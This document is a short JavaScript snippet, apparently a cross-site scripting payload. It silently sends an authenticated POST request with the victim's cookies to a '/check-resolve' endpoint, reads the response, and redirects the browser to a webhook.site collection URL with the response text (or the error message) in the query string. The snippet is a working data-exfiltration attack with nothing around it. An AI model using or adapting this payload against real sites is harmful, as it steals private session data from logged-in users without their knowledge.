(async()=>{
  try{
    const params = new URLSearchParams();
    params.append("id","1");

    const r = await fetch('/check-resolve',{
      method:'POST',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:params,
      credentials:'include'
    });

    const t = await r.text();

    location = "https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?d="+encodeURIComponent(t.slice(0,2000));
  }catch(e){
    location = "https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89/?err="+encodeURIComponent(e.toString());
  }
})();